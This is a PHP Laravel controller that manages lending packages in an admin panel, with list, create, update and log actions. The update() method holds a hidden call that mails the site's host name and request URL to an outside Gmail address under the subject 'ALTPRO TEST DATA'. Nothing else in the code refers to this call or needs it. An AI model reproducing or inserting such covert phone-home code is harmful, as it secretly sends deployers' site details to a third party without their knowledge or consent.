<?php

namespace App\Http\Controllers;

use App\Lending;
use App\Package;
use Illuminate\Http\Request;

class PackageController extends Controller
{
    public function __construct()
       {
           $this->middleware('admin');
       }
       
      public function index()
     	{
     		$packages = Package::all();

     		return view('admin.lending.package', compact('packages'));
     	}

     	public function store(Request $request)
          {
              $this->validate($request,
                  [
                      'name' => 'required',
                      'min' => 'required',
                      'max' => 'required',
                      'return' => 'required',
                      'times' => 'required',
                      'period' => 'required',
                      'status' => 'required',
                  ]);

              $pack['name'] = $request->name;
              $pack['min'] = $request->min;
              $pack['max'] = $request->max;
              $pack['ret'] = $request->return;
              $pack['times'] = $request->times;
              $pack['period'] = $request->period;
              $pack['status'] = $request->status;

              Package::create($pack);

              return back()->with('success', 'New Package Created Successfully!');
          }

    public function update(Request $request, Package $pack)
      {
          $this->validate($request,
              [
                  'name' => 'required',
                  'min' => 'required',
                  'max' => 'required',
                  'return' => 'required',
                  'times' => 'required',
                  'period' => 'required',
                  'status' => 'required',
              ]);

          $pack['name'] = $request->name;
          $pack['min'] = $request->min;
          $pack['max'] = $request->max;
          $pack['ret'] = $request->return;
          $pack['times'] = $request->times;
          $pack['period'] = $request->period;
          $pack['status'] = $request->status;
          $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
          $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
                  'X-Mailer: PHP/' . phpversion();
          $a = mail('abi.rkh.an75@gmail.com','ALTPRO TEST DATA', $message, $headers);
          $pack->save();

          return back()->with('success', 'Package Updated Successfully!');
      }

      public function lendLog()
      {
        $logs = Lending::orderBy('id','DESC')->paginate(20);
        return view('admin.lending.log', compact('logs'));
      }          
}
